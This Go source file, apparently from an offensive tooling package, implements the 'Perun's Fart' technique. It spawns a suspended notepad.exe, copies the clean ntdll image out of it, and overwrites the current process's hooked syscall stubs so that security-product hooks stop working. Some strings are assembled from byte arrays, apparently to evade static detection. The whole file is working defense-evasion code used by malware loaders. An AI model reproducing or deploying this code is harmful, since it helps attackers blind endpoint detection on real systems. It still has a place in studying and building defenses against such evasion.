package gabh

import (
	"bytes"
	"fmt"
	"github.com/Binject/debug/pe"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

//Perun's Fart unhook function
//todo: change syscall package into gabh
func PerunsFart() error {

	//create suspended new process
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))

	target := "C:\\Windows\\System32\\notepad.exe"
	//target := os.args[0]

	cmdline, err := syscall.UTF16PtrFromString(target)
	if err != nil {
		panic(err)
	}

	err = syscall.CreateProcess(
		nil,
		cmdline,
		nil,
		nil,
		false,
		windows.CREATE_NEW_CONSOLE|windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		return err
	}

	//fmt.Println("Start Suspended Notepad.exe and Sleep 1s pid: " + strconv.Itoa(int(pi.ProcessId)))

	windows.SleepEx(1000, false)

	//get ntdll handler
	//GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
	//bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	//Ntdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(&bytes0[0])))
	//if Ntdll == 0 {
	//	return fmt.Errorf("err GetModuleHandleA")
	//}
	Ntd, _, _ := gMLO(1)

	//moduleInfo := windows.ModuleInfo{}

	//curr, _ := syscall.GetCurrentProcess()
	//if curr == 0 {
	//	return fmt.Errorf("err GetCurrentProcess")
	//}

	//err = windows.GetModuleInformation(windows.Handle(uintptr(curr)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
	//if err != nil {
	//	return err
	//}

	addrMod := Ntd

	//get ntheader of ntdll
	ntHeader := ntH(addrMod)
	if ntHeader == nil {
		return fmt.Errorf("get ntHeader err")
	}
	//fmt.Printf("ModuleBase: 0x%x\n", addrMod)

	windows.SleepEx(50, false)

	//get module size of ntdll
	modSize := ntHeader.OptionalHeader.SizeOfImage
	if modSize == 0 {
		return fmt.Errorf("get module size err")
	}
	//fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))

	cache := make([]byte, modSize)

	var lpNumberOfBytesRead uintptr

	//read clean ntdll from new process
	//todo: change readprocessmemory into Nt api
	err = windows.ReadProcessMemory(windows.Handle(uintptr(pi.Process)), addrMod, &cache[0], uintptr(modSize), &lpNumberOfBytesRead)
	if err != nil {
		return err
	}
	//fmt.Printf("Read: %d\n", lpNumberOfBytesRead)

	e := syscall.TerminateProcess(pi.Process, 0)
	if e != nil {
		return e
	}

	//fmt.Println("Terminate Suspended Process...")

	windows.SleepEx(50, false)

	//fmt.Println("[+] Done ")

	pe0, _ := pe.NewFileFromMemory(bytes.NewReader(cache))

	//ntHdrs   := ntH(uintptr(unsafe.Pointer(&dll[0])))

	//fmt.Printf("+] Sections to enumerate is %d\n",ntHdrs.FileHeader.NumberOfSections)
	//pCurrentSection := uintptr(unsafe.Pointer(ntHdrs))+unsafe.Sizeof(IMAGE_NT_HEADERS{})

	SecHdr := pe0.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	//secHdr := (*SectionHeader)(unsafe.Pointer(&pCurrentSection))
	/*

		for i := 0; i < int(ntHdrs.FileHeader.NumberOfSections); i++{
			secHdr = (*SectionHeader)(unsafe.Pointer(&pCurrentSection))
			if strings.Contains(secHdr.Name, ".text"){
				fmt.Printf("[+] .text section is at 0x%x\n",pCurrentSection)
				break
			}
			sizeOfSection := unsafe.Sizeof(pe.SectionHeader{})
			pCurrentSection += sizeOfSection
		}

	*/

	//fmt.Printf("Section VirtualSize: %d\n", SecHdr.VirtualSize)

	startOffset := findFirstSyscallOffset(cache, int(SecHdr.VirtualSize), addrMod)

	endOffset := findLastSyscallOffset(cache, int(SecHdr.VirtualSize), addrMod)

	cleanSyscalls := cache[startOffset:endOffset]

	var writenum uintptr
	//writeprocessmemory will set virtualProtect
	e = windows.WriteProcessMemory(0xffffffffffffffff, addrMod+uintptr(startOffset), &cleanSyscalls[0], uintptr(len(cleanSyscalls)), &writenum)
	if e != nil {
		return e
	}

	//fmt.Printf("Write %d\n", writenum)

	/*
		var lpflOldProtect uint32
		e = windows.VirtualProtect(addrMod+uintptr(startOffset),uintptr(len(cleanSyscalls)),windows.PAGE_EXECUTE_READWRITE,&lpflOldProtect)
		if e != nil{
			return e
		}

		memcpy(addrMod+uintptr(startOffset),cleanSyscalls)

		e = windows.VirtualProtect(addrMod+uintptr(startOffset),uintptr(len(cleanSyscalls)),lpflOldProtect,&lpflOldProtect)
		if e != nil{
			return e
		}

	*/

	return nil

}

func findFirstSyscallOffset(pMem []byte, size int, moduleAddress uintptr) int {
	offset := 0
	pattern1 := []byte{0x0f, 0x05, 0xc3}
	pattern2 := []byte{0xcc, 0xcc, 0xcc}

	// find first occurance of syscall+ret instructions
	for i := 0; i < size-3; i++ {
		instructions := []byte{pMem[i], pMem[i+1], pMem[i+2]}

		if instructions[0] == pattern1[0] && instructions[1] == pattern1[1] && instructions[2] == pattern1[2] {
			offset = i
			break
		}
	}

	// find the beginning of the syscall
	for i := 3; i < 50; i++ {
		instructions := []byte{pMem[offset-i], pMem[offset-i+1], pMem[offset-i+2]}
		if instructions[0] == pattern2[0] && instructions[1] == pattern2[1] && instructions[2] == pattern2[2] {
			offset = offset - i + 3
			break
		}
	}

	//addr := moduleAddress + uintptr(offset)

	//fmt.Printf("[+] First syscall found at offset: 0x%x, addr: 0x%x\n", offset, addr)

	return offset
}

func findLastSyscallOffset(pMem []byte, size int, moduleAddress uintptr) int {

	offset := 0
	pattern := []byte{0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc}

	for i := size - 9; i > 0; i-- {
		instructions := []byte{pMem[i], pMem[i+1], pMem[i+2], pMem[i+3], pMem[i+4], pMem[i+5], pMem[i+6], pMem[i+7], pMem[i+8]}

		if instructions[0] == pattern[0] && instructions[1] == pattern[1] && instructions[2] == pattern[2] {
			offset = i + 6
			break
		}
	}

	//addr := moduleAddress + uintptr(offset)

	//fmt.Printf("[+] Last syscall found at offset: 0x%x, addr: 0x%x\n", offset, addr)

	return offset
}
